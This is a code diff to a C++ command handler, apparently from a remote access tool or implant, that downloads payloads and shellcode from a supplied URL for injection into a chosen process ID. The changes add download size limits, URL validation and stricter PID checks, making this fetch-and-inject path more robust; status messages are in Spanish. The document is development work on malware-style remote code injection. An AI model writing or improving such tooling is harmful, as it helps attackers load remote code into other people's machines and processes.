@@ -16,12 +16,26 @@
 
 namespace nuub::application::commands {
 
+// Max download size: 50MB
+static constexpr size_t MAX_DOWNLOAD_SIZE = 50 * 1024 * 1024;
+
 static size_t write_to_buffer(char* ptr, size_t size, size_t nmemb, void* userdata) {
     auto* vec = static_cast<std::vector<uint8_t>*>(userdata);
+    size_t total = size * nmemb;
+    if (vec->size() + total > MAX_DOWNLOAD_SIZE) {
+        return 0; // Abort: exceeded max size
+    }
     vec->insert(vec->end(),
         reinterpret_cast<uint8_t*>(ptr),
-        reinterpret_cast<uint8_t*>(ptr) + size * nmemb);
-    return size * nmemb;
+        reinterpret_cast<uint8_t*>(ptr) + total);
+    return total;
+}
+
+// Validate URL scheme
+static bool is_url_valid(const std::string& url) {
+    std::string lower = url;
+    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
+    return lower.find("https://") == 0 || lower.find("http://") == 0;
 }
 
 InjectHandler::InjectHandler(interfaces::IReporter& reporter, std::string pc_id)
@@ -57,14 +71,19 @@ domain::Result<void> InjectHandler::handle_inject(const std::string& target,
 
     DWORD pid = 0;
     try {
-        pid = std::stoul(pid_str);
-    } catch (...) {
+        size_t pos = 0;
+        pid = std::stoul(pid_str, &pos);
+        if (pos != pid_str.size() || pid == 0) {
+            reporter_.send_message("PID invalido: " + pid_str);
+            return domain::Result<void>::success();
+        }
+    } catch (const std::exception&) {
         reporter_.send_message("PID invalido: " + pid_str);
         return domain::Result<void>::success();
     }
 
-    if (pid == 0) {
-        reporter_.send_message("PID invalido: 0");
+    if (!is_url_valid(url)) {
+        reporter_.send_message("URL invalida: debe empezar con http:// o https://");
         return domain::Result<void>::success();
     }
 
@@ -85,6 +104,7 @@ domain::Result<void> InjectHandler::handle_inject(const std::string& target,
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 120L);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
+    curl_easy_setopt(curl, CURLOPT_MAXFILESIZE, static_cast<long>(MAX_DOWNLOAD_SIZE));
 
     CURLcode res = curl_easy_perform(curl);
     curl_easy_cleanup(curl);
@@ -201,6 +221,11 @@ domain::Result<void> InjectHandler::handle_shellcode(const std::string& target,
         return domain::Result<void>::success();
     }
 
+    if (!is_url_valid(url)) {
+        reporter_.send_message("URL invalida: debe empezar con http:// o https://");
+        return domain::Result<void>::success();
+    }
+
     reporter_.send_message("Descargando shellcode desde " + url + "...");
 
     CURL* curl = curl_easy_init();
@@ -217,6 +242,7 @@ domain::Result<void> InjectHandler::handle_shellcode(const std::string& target,
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 120L);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
+    curl_easy_setopt(curl, CURLOPT_MAXFILESIZE, static_cast<long>(MAX_DOWNLOAD_SIZE));
 
     CURLcode res = curl_easy_perform(curl);
     curl_easy_cleanup(curl);
